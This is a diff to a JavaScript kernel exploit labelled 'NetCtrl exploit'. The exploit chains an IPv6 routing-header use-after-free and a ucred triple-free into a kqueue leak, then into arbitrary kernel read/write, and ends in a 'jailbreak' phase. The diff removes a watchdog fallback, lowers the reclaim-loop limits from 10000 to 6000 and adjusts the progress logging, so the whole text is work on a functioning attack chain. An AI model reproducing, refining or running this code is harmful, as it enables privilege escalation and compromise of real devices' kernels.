@@ -9,8 +9,8 @@ include('binloader.js');
 // ==========================
 // NetCtrl exploit
 // ==========================
-var WATCHDOG_ACTIVE = false;
-var WATCHDOG_LAST_TICK = Date.now();
+var _ACTIVE = false;
+var _LAST_TICK = Date.now();
 
 // Polyfill for padStart (older JS engines)
 if (!String.prototype.padStart) {
@@ -152,7 +152,7 @@ var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 8;
-var KQUEUE_ITERATIONS = 10000;
+var KQUEUE_ITERATIONS = 6000;
 var MAX_ROUNDS_TWIN = 5;
 var MAX_ROUNDS_TRIPLET = 200;
 var MAIN_CORE = 4;
@@ -241,35 +241,6 @@ safe(syscalls, 'syscalls');
 safe(kernel, 'kernel');
 safe(utils, 'utils');
 safe(jsmaf, 'jsmaf');
-/* ===========================
- *   Watchdog (progress monitor)
- * =========================== 
- */
-
-function watchdog_start() {
-  var timeoutMs = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 5000;
-  if (WATCHDOG_ACTIVE) return;
-  WATCHDOG_ACTIVE = true;
-  log('[FLOW] Watchdog started (timeout = ' + timeoutMs + 'ms)');
-
-  // interval أوسع عشان ندي event loop فرصة يتنفس
-  var id = jsmaf.setInterval(() => {
-    var delta = Date.now() - WATCHDOG_LAST_TICK;
-    if (delta > timeoutMs) {
-      log('[WD] TIMEOUT — no progress for ' + delta + 'ms');
-      log('[FLOW] Watchdog triggered fallback → exploit_phase_trigger');
-      WATCHDOG_ACTIVE = false;
-      jsmaf.clearInterval(id);
-
-      // fallback
-      yield_to_render(exploit_phase_trigger);
-      log('[FLOW] Watchdog stopped after timeout');
-    }
-  }, 1200); // ← بدل 500ms
-}
-function watchdog_tick(label) {
-  WATCHDOG_LAST_TICK = Date.now();
-}
 
 /* ===========================
   *   Worker Creation
@@ -995,14 +966,11 @@ function netctrl_exploit() {
     return;
   }
   log('Setting up exploit...');
-  watchdog_start();
-  watchdog_tick('netctrl_exploit');
   log('[FLOW] Requesting transition to: exploit_phase_setup');
   yield_to_render(exploit_phase_setup);
 }
 function exploit_phase_setup() {
   log('[FLOW] inside exploit_phase_setup');
-  watchdog_tick('exploit_phase_setup');
   setup();
   log('Workers spawned');
   exploit_count = 0;
@@ -1013,7 +981,6 @@ function exploit_phase_setup() {
 }
 function exploit_phase_trigger() {
   log('[FLOW] inside exploit_phase_trigger');
-  watchdog_tick('exploit_phase_trigger');
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Failed to acquire kernel R/W');
     cleanup();
@@ -1037,7 +1004,6 @@ function exploit_phase_trigger() {
 function exploit_phase_leak() {
   log('[DEBUG] ENTER exploit_phase_leak TOP');
   log('[FLOW] inside exploit_phase_leak');
-  watchdog_tick('exploit_phase_leak');
   if (!leak_kqueue()) {
     log('[LEAK] leak_kqueue failed, retrying trigger...');
     log('[FLOW] Early exit from phase');
@@ -1052,7 +1018,6 @@ function exploit_phase_leak() {
 }
 function exploit_phase_rw() {
   log('[FLOW] inside exploit_phase_rw');
-  watchdog_tick('exploit_phase_rw');
   log('[RW] exploit_phase_rw: enter');
   var ok = retry('setup_arbitrary_rw', 3, () => setup_arbitrary_rw());
   if (!ok) {
@@ -1068,7 +1033,6 @@ function exploit_phase_rw() {
 }
 function exploit_phase_jailbreak() {
   log('[FLOW] inside exploit_phase_jailbreak');
-  watchdog_tick('exploit_phase_jailbreak');
   jailbreak();
   log('[FLOW] EXIT exploit_phase_jailbreak');
   log('[FLOW] Requesting transition to: exploit_phase_finish');
@@ -1080,7 +1044,6 @@ function exploit_phase_finish() {
     return;
   }
   exploit_end = true;
-  WATCHDOG_ACTIVE = false; // اختياري
   log('Exploit completed successfully');
   cleanup();
 }
@@ -1401,7 +1364,7 @@ function trigger_ucred_triplefree() {
     // Free one
     free_rthdr(ipv6_socks[twins[1]]);
     var count = 0;
-    while (count < 10000) {
+    while (count < 6000) {
       trigger_iov_recvmsg();
       sched_yield();
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
@@ -1411,7 +1374,7 @@ function trigger_ucred_triplefree() {
       read(new BigInt(iov_sock_0), tmp, 1);
       count++;
     }
-    if (count === 10000) {
+    if (count === 6000) {
       log('[TRIPLE] Dropped out from reclaim loop');
       close(new BigInt(uaf_socket));
       continue;
@@ -1478,9 +1441,8 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
   while (count < KQUEUE_ITERATIONS) {
-    if (count % 500 === 0) {
+    if (count % 300 === 0) {
       log('[LEAK] Progress iteration=' + count);
-      watchdog_tick('leak_kqueue_loop');
     }
     kq = kqueue();
 
@@ -1606,7 +1568,7 @@ function kreadslow(addr, size) {
   var count = 0;
   var zeroMemoryCount = 0;
 
-  while (count < 10000) {
+  while (count < 6000) {
     // في kreadslow
     if (safe_memory_available() === 0) {
       zeroMemoryCount++;
@@ -1617,9 +1579,8 @@ function kreadslow(addr, size) {
       zeroMemoryCount = 0;
     }
     count++;
-    if (count % 500 === 0) {
+    if (count % 300 === 0) {
       log('[KR] Stage1 progress=' + count);
-      watchdog_tick('kreadslow_stage1');
     }
 
     trigger_uio_writev();
@@ -1639,8 +1600,8 @@ function kreadslow(addr, size) {
     write(new BigInt(uio_sock_1), tmp, size);
   }
 
-  if (count === 10000) {
-    debug('kreadslow - Failed uio reclaim after 10000 iterations');
+  if (count === 6000) {
+    debug('kreadslow - Failed uio reclaim after 6000 iterations');
     return BigInt_Error;
   }
 
@@ -1656,7 +1617,7 @@ function kreadslow(addr, size) {
   var zeroMemoryCount2 = 0;
   while (true) {
     count2++;
-    if (count2 > 10000) {
+    if (count2 > 6000) {
       log('[KR] Stage2 failed after max iterations');
       // زي الأصلي: قبل ما نرجع Error ننضف iov loop لو لسه شغّال
       write(new BigInt(iov_sock_1), tmp, 1);
@@ -1765,12 +1726,11 @@ function kwriteslow(addr, buffer, size) {
       zeroMemoryCount = 0;
     }
 
-    if (count % 500 === 0) {
+    if (count % 300 === 0) {
       log('[KW] Stage1 progress=' + count);
-      watchdog_tick('kwriteslow_stage1');
     }
     count++;
-    if (count > 10000) {
+    if (count > 6000) {
       log('[KW] Stage1 failed after max iterations');
       return BigInt_Error;
     }
@@ -1810,12 +1770,12 @@ function kwriteslow(addr, buffer, size) {
       zeroMemoryCount2 = 0;
     }
 
-    if (count2 % 500 === 0) {
+    if (count2 % 300 === 0) {
       log('[KW] Stage2 progress=' + count2);
-      watchdog_tick('kwriteslow_stage2');
+      
     }
     count2++;
-    if (count2 > 10000) {
+    if (count2 > 6000) {
       log('[KW] Stage2 failed after max iterations');
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
